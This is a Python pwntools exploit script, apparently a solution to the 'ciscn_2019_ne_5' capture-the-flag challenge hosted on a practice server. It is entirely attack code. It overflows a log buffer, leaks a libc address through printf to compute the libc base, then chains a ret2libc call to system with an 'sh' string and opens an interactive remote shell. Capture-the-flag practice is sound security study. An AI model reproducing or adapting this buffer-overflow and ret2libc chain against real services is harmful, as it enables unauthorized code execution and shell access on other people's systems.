#!/usr/bin/python3.6
from pwn import *
from LibcSearcher import LibcSearcher

filename = './ciscn_2019_ne_5'
e = ELF(filename)
# p = process(filename)
p = remote("node3.buuoj.cn", 26125)

log.level = 'DEBUG'
for k, v in e.got.items():
    log.debug(f'got:{k}={hex(v)}')

# TODO HINT
# GetFlag: strcpy
# AddLog: scanf truncate "\x0b"
# Print: system("echo Printing")

ret_main = e.sym['main']
output_plt, c_func_got = e.plt['printf'], e.got['__libc_start_main']
log.info(f'printf:plt={hex(output_plt)}, __libc_start_main:got={hex(c_func_got)}')

def Auth():
    p.recvuntil(b'password:')
    p.sendline(b'administrator')

def AddLog(content):
    p.recvuntil(b'Input your operation:')
    p.recvuntil(':')
    p.sendline(b'1')
    p.recvuntil(b'Please input new log info:')
    p.sendline(content)

def GetFlag():
    p.recvuntil(b'Input your operation:')
    p.recvuntil(b':')
    p.sendline(b'4')
    p.recvuntil(b'The flag is your log:')

def Display():
    p.recvuntil(b'Input your operation:')
    p.recvuntil(b':')
    p.sendline(b'2')

ra_offset = 0x48+4

Auth()
AddLog(b'0' * ra_offset + p32(output_plt) + p32(ret_main) + p32(c_func_got))
Display()
GetFlag()

p.recvuntil(b'\n')

c_func_addr = u32(p.recv(4))
log.success(f'__libc_start_main:{hex(c_func_addr)}')

searcher = LibcSearcher()
searcher.add_condition('__libc_start_main', c_func_addr)
base_addr = c_func_addr - searcher.dump('__libc_start_main')
system_addr = base_addr + searcher.dump('system')
bin_sh_addr = base_addr + searcher.dump('str_bin_sh')
log.info(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')

Auth()

AddLog(b'1' * ra_offset + p32(system_addr) + p32(ret_main) + p32(bin_sh_addr + len('/bin/')))
GetFlag()

p.interactive()